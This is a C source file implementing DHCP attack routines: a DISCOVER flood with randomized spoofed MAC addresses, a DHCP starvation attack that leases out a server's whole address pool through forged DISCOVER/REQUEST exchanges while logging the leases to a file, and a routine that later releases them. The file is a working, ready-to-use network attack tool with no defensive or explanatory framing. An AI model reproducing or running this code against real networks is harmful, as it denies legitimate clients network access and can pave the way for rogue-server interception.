#include "attacks.h"

void DHCPFlood(int sock, struct user_opt *uopt)
{
	u_char eth_dst[ETH_ALEN]; // ethernet destination address
	u_char eth_src[ETH_ALEN]; // ethernet source address
	u_int ip_dst;			  // ip destination address
	struct ethhdr *eth;		  // pointer on ethernet header
	struct iphdr *ip;		  // pointer on ip header
	struct udphdr *udp;		  // pointer on udp header
	struct bootphdr *bootp;	  // pointer on bootp header
	u_char *dhcp;	  		  // pointer on dhcp header
	u_char *packet = (unsigned char *)malloc(1024); // memory for the dhcp packet
	u_char rand_mac[ETH_ALEN]; // randomize client mac address
	struct sigaction act;
	int i;
	unsigned long num = 0;
	u_short pack_am;		  // packets amount in time-out

	srand(time(0));

	/* Creation of DHCP header */
	dhcp = CreateStandartDiscover(uopt->lease_time, uopt->renewal_time, uopt->rebinding_time);

	/* Creation of BOOTP header */
	for(i = 0; i < ETH_ALEN; i++)
		rand_mac[i] = rand();

	bootp = CreateBootpLayer(BOOTP_REQUEST, BOOTP_HTYPE_ETHER, ETH_ALEN, 0,
							 rand(), 0, 0, 0, 0, 0, uopt->relay_ip, rand_mac, 0, 0, DHCP_COOKIE);

	/* Creation of UDP header */
	udp = CreateUDPLayer(68, 67, BOOTP_HLEN + 22);

	/* Creation of IP header */
	ip_dst = inet_addr("255.255.255.255");

	ip = CreateIPLayer(5, 4, 0, rand(), IP_DF, 64, IPPROTO_UDP, uopt->relay_ip, 
					   ip_dst, UDP_HLEN + BOOTP_HLEN + 22); 

	ip->check = Checksum((u_short *)ip, IP_HLEN);

	/* Creation of Ethernet header */
	memset(eth_dst, 0xff, ETH_ALEN);
	memcpy(eth_src, uopt->relay_mac, ETH_ALEN);
	eth = CreateEthLayer(eth_dst, eth_src, ETH_P_IP);

	memcpy(packet, eth, ETH_HLEN);
	memcpy(packet + ETH_HLEN, ip, IP_HLEN);
	memcpy(packet + ETH_HLEN + IP_HLEN, udp, UDP_HLEN);
	memcpy(packet + ETH_HLEN + IP_HLEN + UDP_HLEN, bootp, BOOTP_HLEN);
	memcpy(packet + ETH_HLEN + IP_HLEN + UDP_HLEN + BOOTP_HLEN, dhcp, 22);

	/* set the signal handling */
	memset(&act, 0x0, sizeof(struct sigaction));
	act.sa_handler = SigHandler;
	sigaction(SIGINT, &act, NULL);

	BREAK = 1;

	pack_am = uopt->pack_am;

	while(BREAK)
	{
		while(pack_am)
		{
			send(sock, packet, STAND_DISCOVER_LEN, 0);

			printf("[%lu] Discover from %02x:%02x:%02x:%02x:%02x:%02x ", num, bootp->chaddr[0], bootp->chaddr[1], bootp->chaddr[2],
	    													   bootp->chaddr[3], bootp->chaddr[4], bootp->chaddr[5]);
	    	printf("id: 0x%04x\n", ntohl(bootp->xid));

			ip->id = rand(); 								// set randomize ip header id
			ip->check = 0;   								// set to zero ip checksum
			ip->check = Checksum((u_short *)ip, IP_HLEN);	// calculate ip checksum again

	    	bootp->xid = rand();						// set randomize bootp id
	    	for(i = 0; i < ETH_ALEN; i++)				// set randomize client mac
	    		rand_mac[i] = rand();

	   		memcpy(bootp->chaddr, rand_mac, ETH_ALEN);  // new client MAC

	   		memcpy(packet, eth, ETH_HLEN);
	   		memcpy(packet + ETH_HLEN, ip, IP_HLEN); // copy new ip header into packet
	   		memcpy(packet + ETH_HLEN + IP_HLEN + UDP_HLEN, bootp, BOOTP_HLEN); // copy new bootp header

	   	    num++;
	   	    pack_am--;
		}

		pack_am = uopt->pack_am;

	    sleep(uopt->timeout); // time-out between seding of messages
	}

	free(eth);
	free(ip);
	free(udp);
	free(bootp);
	free(dhcp);
	free(packet);

	return;
}

int RECV_SOCK; // socket for receiving of messages

void DHCPStarvation(int sock, struct user_opt *uopt)
{
	u_char eth_dst[ETH_ALEN];  // ethernet destination address
	u_int ip_dst;			   // ip destination address
	u_char rand_mac[ETH_ALEN]; // randomize client mac address
	
	struct ethhdr *eth;		   // pointer on DISCOVER ethernet header
	struct iphdr *ip;		   // pointer on DISCOVER ip header
	struct udphdr *udp;		   // pointer on DISCOVER udp header
	struct bootphdr *bootp;	   // pointer on DISCOVER bootp header
	u_char *dhcp;	  		   // pointer on DISCOVER dhcp header
	u_char *discover = (u_char *)malloc(1024); // memory for a DISCOVER

	struct ethhdr *eth_req;    // pointer on REQUEST ethernet header
	struct iphdr *ip_req;	   // pointer on REQUEST ip header
	struct udphdr *udp_req;	   // pointer on REQUEST udp header
	struct bootphdr *bootp_req;// pointer on REQUEST bootp header
	u_char *dhcp_req;		   // pointer on REQUEST dhcp header
	u_char *request = (u_char *)malloc(1024); // memory for a REQUEST
	struct messg_data mdt;	          // reserved address data

	struct sigaction act; // signal structure
	int i = 0;	          // counter
	pthread_t RcvThread;  // new thread id

	srand(time(0));

	/* Create first discover message */

	/* Creation of DHCP header */
	dhcp = CreateStandartDiscover(uopt->lease_time, uopt->renewal_time, uopt->rebinding_time);

	/* Creation of BOOTP header */
	for(i = 0; i < ETH_ALEN; i++)
		rand_mac[i] = rand();

	bootp = CreateBootpLayer(BOOTP_REQUEST, BOOTP_HTYPE_ETHER, ETH_ALEN, 0,
							 rand(), 0, 0, 0, 0, 0, uopt->relay_ip, rand_mac, 0, 0, DHCP_COOKIE);

	/* Creation of UDP header */
	udp = CreateUDPLayer(68, 67, BOOTP_HLEN + 22);

	/* Creation of IP header */
	ip_dst = inet_addr("255.255.255.255");

	ip = CreateIPLayer(5, 4, 0, rand(), IP_DF, 64, IPPROTO_UDP, uopt->relay_ip, 
					   ip_dst, UDP_HLEN + BOOTP_HLEN + 22); 

	ip->check = Checksum((u_short *)ip, IP_HLEN);

	/* Creation of Ethernet header */
	memset(eth_dst, 0xff, ETH_ALEN);
	eth = CreateEthLayer(eth_dst, uopt->relay_mac, ETH_P_IP);

	memcpy(discover, eth, ETH_HLEN);
	memcpy(discover + ETH_HLEN, ip, IP_HLEN);
	memcpy(discover + ETH_HLEN + IP_HLEN, udp, UDP_HLEN);
	memcpy(discover + ETH_HLEN + IP_HLEN + UDP_HLEN, bootp, BOOTP_HLEN);
	memcpy(discover + ETH_HLEN + IP_HLEN + UDP_HLEN + BOOTP_HLEN, dhcp, 22);

	/* set the signal handling */
	memset(&act, 0x0, sizeof(struct sigaction));
	act.sa_handler = SigHandler;
	sigaction(SIGINT, &act, NULL);

	BREAK = 1;

	/* Create a channel to doughter process */
	int fds[2];
	pipe(fds);
	RECV_SOCK = sock;

	/* Thread for receiving of OFFER/ACK answers */
	pthread_create(&RcvThread, NULL, (void *)&RecvMessg, (void *)&fds[1]);

	while(BREAK)
	{
		send(sock, discover, STAND_DISCOVER_LEN, 0);

		/* After the sending of a DISCOVER, we will get answers
		   in new thread. If we will get OFFER, new thread
		   will write important data(struct messg_data) and send it
		   by channel */
		read(fds[0], (u_char *)&mdt, sizeof(struct messg_data));

	    /* Then we should create REQUEST message with using of got parameters
	       to reserve the address */

	    /* DHCP header */
	    dhcp_req = CreateStandartRequest(mdt.offer_addr, uopt->lease_time, uopt->renewal_time,
	    								 uopt->rebinding_time, mdt.srv_addr);

	    /* BOOTP header */
	    bootp_req = CreateBootpLayer(BOOTP_REQUEST, BOOTP_HTYPE_ETHER, ETH_ALEN, 0,
	    							 ntohl(mdt.xid), 0, 0, 0, 0, 0, uopt->relay_ip, mdt.client_mac,
	    							 0, 0, DHCP_COOKIE);

	    /* UDP header */
	    udp_req = CreateUDPLayer(68, 67, BOOTP_HLEN + 34);

	    /* IP header */
	    ip_req = CreateIPLayer(5, 4, 0, 0, IP_DF, 64, IPPROTO_UDP, uopt->relay_ip,
	    					   ip_dst, UDP_HLEN + BOOTP_HLEN + 34);

	    ip_req->check = Checksum((u_short *)ip_req, IP_HLEN);

	    /* Ehternet header */
	    eth_req = CreateEthLayer(eth_dst, uopt->relay_mac, ETH_P_IP);

	    memcpy(request, eth_req, ETH_HLEN);
	    memcpy(request + ETH_HLEN, ip_req, IP_HLEN);
	    memcpy(request + ETH_HLEN + IP_HLEN, udp_req, UDP_HLEN);
	    memcpy(request + ETH_HLEN + IP_HLEN + UDP_HLEN, bootp_req, BOOTP_HLEN);
	    memcpy(request + ETH_HLEN + IP_HLEN + UDP_HLEN + BOOTP_HLEN, dhcp_req, 34);

	    /* Send request to the server */
	    send(sock, request, STAND_REQUEST_LEN, 0);

	    /* Now we are changing some BOOTP parameters, that will make
		   new discover message*/
		ip->id = rand(); 								// set randomize IP header id
		ip->check = 0;   								// set to zero IP checksum
		ip->check = Checksum((u_short *)ip, IP_HLEN);	// calculate IP checksum again

	    bootp->xid = rand();							// set randomize BOOTP id
	    for(i = 0; i < ETH_ALEN; i++)					// set randomize client mac
	    	rand_mac[i] = rand();
	    memcpy(bootp->chaddr, rand_mac, ETH_ALEN);

	    memcpy(discover + ETH_HLEN, ip, IP_HLEN); 						     // copy new IP header into packet
	    memcpy(discover + ETH_HLEN + IP_HLEN + UDP_HLEN, bootp, BOOTP_HLEN); // copy new BOOTP header
	} 

	free(eth);
	free(ip);
	free(udp);
	free(bootp);
	free(dhcp);
	free(discover);

	free(eth_req);
	free(ip_req);
	free(udp_req);
	free(bootp_req);
	free(dhcp_req);
	free(request);

	pthread_join(RcvThread, NULL);

	return;
}

void RecvMessg(void *channel)
{
	u_char *messg = (u_char *)malloc(1024); 
	struct ethhdr *eth = (struct ethhdr *)messg;
	struct iphdr *ip = (struct iphdr *)(messg + ETH_HLEN);
	struct udphdr *udp;
	struct bootphdr *bootp;
	u_char *dhcp;
	struct messg_data mdt; // BOOTP/DHCP message data(attacks.h)
	int i;				   // counter 
	int recv_bytes;		   // received bytes by recv()
	int dhcp_len;		   // DHCP header length
	int colen;			   // concreate DHCP option length
	FILE *file;

	/* Open a file for writting of ACK answers */
	if((file = fopen(PATH_TO_FILE, "w")) == NULL)
	{
		printf("RecvMesg() error: %s\n", strerror(errno));

		pthread_exit(NULL);
	}

	fprintf(file, "Server MAC; Server IP; Lease time; ID; Client MAC; Client IP; Relay MAC; Relay IP\n");
	
	while(BREAK)
	{
		recv_bytes = recv(RECV_SOCK, messg, 1024, 0);

		udp = (struct udphdr *)(messg + ETH_HLEN + ip->ihl*4);

		/* If source UDP port isn't 67,
		   then it isn't OFFER or ACK  */
		if(ntohs(udp->uh_sport) != 67)
			continue;

		bootp = (struct bootphdr *)(messg + ETH_HLEN + ip->ihl*4 + UDP_HLEN);

		dhcp = (u_char *)(messg + ETH_HLEN + ip->ihl*4 + UDP_HLEN + BOOTP_HLEN);

		if(dhcp[2] == DHCP_OFFER)
		{
			dhcp_len = recv_bytes - (ETH_HLEN + ip->ihl*4 + UDP_HLEN + BOOTP_HLEN);

			mdt.xid        = bootp->xid;
			mdt.offer_addr = bootp->yaddr;
			mdt.messg_type = DHCP_OFFER;
			memcpy(mdt.client_mac, bootp->chaddr, 6);

			/* 'i'     - bytes counter of all DHCP options
			   'colen' - concreate option length
			   colen increases by special byte in option + 2(opt identifier + byte
			   that have number of legth) */
			for(i = 0, colen = 0; i < dhcp_len ; i+=colen)
			{
				if(dhcp[i] == DHCP_OPT_SRV_IDENT)
				{
					mdt.srv_addr = *(u_int *)&dhcp[i + 2];

					break;
				}

				else
					colen = 2 + dhcp[i + 1];
			}

			/* Write structure in parent thread */ 
			write(*(int *)channel, (u_char *)&mdt, sizeof(struct messg_data));

			/* Set to zero our structure message data,
		       it's important! */
			memset(&mdt, 0x0, sizeof(struct messg_data));
		}

		else if(dhcp[2] == DHCP_ACK)
		{
			dhcp_len = recv_bytes - (ETH_HLEN + ip->ihl*4 + UDP_HLEN + BOOTP_HLEN);

			printf("ACK ");

			/* Write to file server MAC address */
			fprintf(file, "%02x:%02x:%02x:%02x:%02x:%02x ", eth->h_source[0], eth->h_source[1], eth->h_source[2],
													  eth->h_source[3], eth->h_source[4], eth->h_source[5]);

			/* 'i'     - bytes counter of all DHCP options
			   'colen' - concreate option length
			   colen increases by special byte in option + 2(opt identifier + byte
			   that have number of legth) */
			for(i = 0, colen = 0; i < dhcp_len ; i+=colen)
			{
				if(dhcp[i] == DHCP_OPT_SRV_IDENT)
				{
					printf("Server %s ", inet_ntoa(*(struct in_addr *)&dhcp[i + 2]));
					
					/* Write to file server IP address */
					fprintf(file, "%s ", inet_ntoa(*(struct in_addr *)&dhcp[i + 2]));

					colen = 2 + dhcp[i + 1];

					continue;
				}

				if(dhcp[i] == DHCP_OPT_ADDR_LS_TIME)
				{
					printf("Lease time %u(sec) ", ntohl(*(u_int *)&dhcp[i + 2]));
					fprintf(file, "%u ", ntohl(*(u_int *)&dhcp[i + 2]));

					colen = 2 + dhcp[i + 1];

					continue;
				}


				else
					colen = 2 + dhcp[i + 1];
			}

			printf("Reserved address %s\n", inet_ntoa(*(struct in_addr *)&bootp->yaddr));
			
			/* write to file: Session ID, Client MAC address, Client IP address */
			fprintf(file, "%04x ", ntohl(bootp->xid));
			fprintf(file, "%02x:%02x:%02x:%02x:%02x:%02x ", bootp->chaddr[0], bootp->chaddr[1], bootp->chaddr[2],
															bootp->chaddr[3], bootp->chaddr[4], bootp->chaddr[5]);
			fprintf(file, "%s ", inet_ntoa(*(struct in_addr *)&bootp->yaddr));
			fprintf(file, "%02x:%02x:%02x:%02x:%02x:%02x ", eth->h_dest[0], eth->h_dest[1], eth->h_dest[2],
															eth->h_dest[3], eth->h_dest[4], eth->h_dest[5]);
			fprintf(file, "%s\n", inet_ntoa(*(struct in_addr *)&bootp->giaddr));

			continue;
		}

		 else
			continue;
	}

    free(messg);

    fclose(file);

    close(RECV_SOCK);

    pthread_exit(NULL);
}

int FreeAddrs(int sock)
{
	FILE *file;

	/* first we will need to open the file,
	   then parse it */
	if((file = fopen(PATH_TO_FILE, "r")) == NULL)
		return -1;

	/* Skip first sring from file */
	char first_str[256];
	u_short first_str_len;

	memset(first_str, 0x0, 256);

	fgets(first_str, 256, file);

	first_str_len = strlen(first_str);

	/* Begin to read data; If next character is EOF,
	   then break cycle */
	fseek(file, first_str_len, SEEK_SET);

	char ch;		   // character from file
	char data_str[24]; // MAC, IP, ID... string
	int i;		 	   // counter
	int pack_num = 1;

	u_char srv_mac[ETH_ALEN]; // server MAC
	u_int srv_ip;			  // server IP
	u_int id;				  // ID
	u_char cl_mac[ETH_ALEN];  // client MAC
	u_int cl_ip;			  // client IP
	u_char rel_mac[ETH_ALEN]; // relay MAC
	u_int rel_ip;			  // relay IP

	u_char *messg = (u_char *)malloc(512);
	struct ethhdr *eth;
	struct iphdr *ip;
	struct udphdr *udp;
	struct bootphdr *bootp;
	u_char *dhcp;

	while((ch = getc(file)) != EOF)
	{
    	fseek(file, -1, SEEK_CUR);

		/* Get server MAC string and convert it to real address */
		for(i = 0; (ch = getc(file)) != ' '; i++)
			data_str[i] = ch;
		data_str[i] = '\0';

		StrToMac(data_str, srv_mac);

		/* Get server IP string and convert it to real address */
		for(i = 0; (ch = getc(file)) != ' '; i++)
			data_str[i] = ch;
		data_str[i] = '\0';

		srv_ip = inet_addr(data_str);

		/* Get piece of string(lease time) and skip it*/
		for(i = 0; (ch = getc(file)) != ' '; i++)
			data_str[i] = ch;
		data_str[i] = '\0';

		/* Get ID and convert it to real value */
		for(i = 0; (ch = getc(file)) != ' '; i++)
			data_str[i] = ch;
		data_str[i] = '\0';

		id = strtoul(data_str, NULL, 16);
		
		/* Get client MAC string and convert it to real address */
		for(i = 0; (ch = getc(file)) != ' '; i++)
			data_str[i] = ch;
		data_str[i] = '\0';

		StrToMac(data_str, cl_mac);

		/* Get client IP string and convert it to real address */
		for(i = 0;(ch = getc(file)) != ' '; i++)
			data_str[i] = ch;
		data_str[i] = '\0';

		cl_ip = inet_addr(data_str);

		/* Get relay MAC */
		for(i = 0; (ch = getc(file)) != ' '; i++)
			data_str[i] = ch;
		data_str[i] = '\0';

		StrToMac(data_str, rel_mac);

		/* Get relay IP */
		for(i = 0; ; i++)
		{
			ch = getc(file);

			if(ch == '\n' || ch == EOF)
				break;

			data_str[i] = ch;
		}

		data_str[i] = '\0';

		rel_ip = inet_addr(data_str);

		/* Now create a release message... */
		dhcp  = CreateStandartRelease(srv_ip);

		bootp = CreateBootpLayer(BOOTP_REQUEST, BOOTP_HTYPE_ETHER, ETH_ALEN, 0, id,
								 0, 0, cl_ip, 0, 0, rel_ip, cl_mac, 0, 0, DHCP_COOKIE);

		udp   = CreateUDPLayer(68, 67, BOOTP_HLEN + 10);

		ip 	  = CreateIPLayer(5, 4, 0, rand(), IP_DF, 64, IPPROTO_UDP, rel_ip, srv_ip,
							  UDP_HLEN + BOOTP_HLEN + 10);
		ip->check = Checksum((u_short *)ip, IP_HLEN);

		eth = CreateEthLayer(srv_mac, rel_mac, ETH_P_IP);

		memcpy(messg, eth, ETH_HLEN);
		memcpy(messg + ETH_HLEN, ip, IP_HLEN);
		memcpy(messg + ETH_HLEN + IP_HLEN, udp, UDP_HLEN);
		memcpy(messg + ETH_HLEN + IP_HLEN + UDP_HLEN, bootp, BOOTP_HLEN);
		memcpy(messg + ETH_HLEN + IP_HLEN + UDP_HLEN + BOOTP_HLEN, dhcp, 10);

		send(sock, messg, STAND_RELEASE_LEN, 0);

		pack_num++;
	}

	free(eth);
	free(ip);
	free(udp);
	free(bootp);
	free(messg);

	return pack_num;
}

void SigHandler(int arg)
{
	BREAK--;

	return;
}